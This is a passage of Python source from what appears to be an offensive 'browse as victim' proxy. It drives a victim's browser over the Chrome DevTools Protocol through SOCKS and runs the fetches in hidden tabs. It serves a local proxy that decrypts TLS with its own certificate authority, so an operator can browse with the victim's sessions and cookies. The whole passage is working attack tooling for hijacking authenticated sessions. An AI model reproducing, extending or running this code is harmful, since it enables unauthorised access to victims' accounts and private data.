    writer.write(f"HTTP/1.1 {response.status_code} {response.reason}\r\n".encode("iso-8859-1"))
    for name, value in headers:
        writer.write(f"{name}: {value}\r\n".encode("iso-8859-1", errors="ignore"))
    writer.write(b"\r\n")
    if response.body:
        writer.write(response.body)
    with contextlib.suppress(ConnectionResetError, BrokenPipeError):
        await writer.drain()


def _error_response(status: HTTPStatus, message: str) -> ProxiedResponse:
    body = message.encode("utf-8", errors="replace")
    return ProxiedResponse(
        status_code=status.value,
        reason=status.phrase,
        headers=[("Content-Type", "text/plain; charset=utf-8")],
        body=body,
    )


class BrowseAsVictimProxy:
    def __init__(self, options: BrowseAsVictimProxyOptions):
        self.options = options
        self.ca = CertAuthority(options.cert_dir)
        self.cdp: CDPClient | None = None
        self.pool: HiddenTabPool | None = None
        self.server: asyncio.AbstractServer | None = None
        self.closed = asyncio.Event()

    async def start(self) -> None:
        self.ca.ensure_ca()
        self.cdp = await CDPClient.connect(self.options.cdp_endpoint, self.options.socks)
        self.pool = HiddenTabPool(
            self.cdp,
            self.options.pool_size,
            self.options.fetch_timeout,
            self.options.hidden,
            self.options.subresource_loader,
            self.options.deny_downloads,
        )
        await self.pool.start()
        self.server = await asyncio.start_server(
            self._handle_client,
            host=self.options.listen_host,
            port=self.options.listen_port,
            limit=1024 * 1024,
        )

    async def stop(self) -> None:
        if self.closed.is_set():
            return
        self.closed.set()
        if self.server:
            self.server.close()
            await self.server.wait_closed()
            self.server = None
        if self.pool:
            await self.pool.close()
            self.pool = None
        if self.cdp:
            await self.cdp.close()
            self.cdp = None

    async def wait_closed(self) -> None:
        await self.closed.wait()

    async def _handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        peer = writer.get_extra_info("peername") or ("?", 0)
        info("proxy client connected {}:{}", peer[0], peer[1])
        try:
            await self._serve_connection(reader, writer, default_scheme="http")
        except Exception as exc:
            if _is_expected_client_disconnect(exc):
                info("proxy client disconnected {}:{} {}", peer[0], peer[1], _format_exception(exc))
            else:
                warn("proxy client error {}:{} {}", peer[0], peer[1], _format_exception(exc))
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()

    async def _serve_connection(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        *,
        default_scheme: str,
        connect_host: str | None = None,
        connect_port: int | None = None,
    ) -> None:
        assert self.pool is not None
        while True:
            try:
                request = await _read_http_request(reader)
            except Exception as exc:
                if _is_expected_client_disconnect(exc):
                    info("proxy request ended: {}", _format_exception(exc))
                else:
                    warn("proxy request parse failed: {}", _format_exception(exc))
                return
            if request is None:
                return

            if request.method == "CONNECT":
                await self._handle_connect(request, reader, writer)
                return

            keep_alive = request.should_keep_alive()
            try:
                absolute_url = _absolute_url(request, default_scheme, connect_host, connect_port)
                response = await self.pool.fetch(request, absolute_url)
                location = response_header(response, "Location")
                info(
                    "proxy {} {} -> {} {} bytes={}{}",
                    request.method,
                    absolute_url,
                    response.status_code,
                    response.reason,
                    len(response.body),
                    f" location={location}" if location else "",
                )
            except Exception as exc:
                error_text = _format_exception(exc)
                warn("proxy fetch failed {} {}: {}", request.method, request.target, error_text)
                response = _error_response(HTTPStatus.BAD_GATEWAY, error_text)
                keep_alive = False

            await _write_http_response(writer, response, keep_alive=keep_alive)
            if not keep_alive:
                return

    async def _handle_connect(
        self,
        request: HttpRequest,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        hostname, port = _split_authority(request.target, 443)
        writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        await writer.drain()
        await writer.start_tls(self.ca.ssl_context_for_host(hostname))
        await self._serve_connection(
            reader,
            writer,
            default_scheme="https",
            connect_host=hostname,
            connect_port=port,
        )


def response_header(response: ProxiedResponse, name: str) -> str | None:
    name_l = name.lower()
    for header_name, value in response.headers:
        if header_name.lower() == name_l:
            return value
    return None


async def serve_browse_as_victim_proxy(options: BrowseAsVictimProxyOptions) -> None:
    proxy = BrowseAsVictimProxy(options)
    await proxy.start()
    print(f"CDP proxy listening on http://{options.listen_host}:{options.listen_port}")
    print(f"Operator browser proxy: {options.listen_host}:{options.listen_port}")
    print(f"CA certificate: {proxy.ca.ca_cert_path.resolve()}")
    print("Press Ctrl+C to stop.")
    try:
        await proxy.wait_closed()
    except asyncio.CancelledError:
        pass
    finally:
        await proxy.stop()
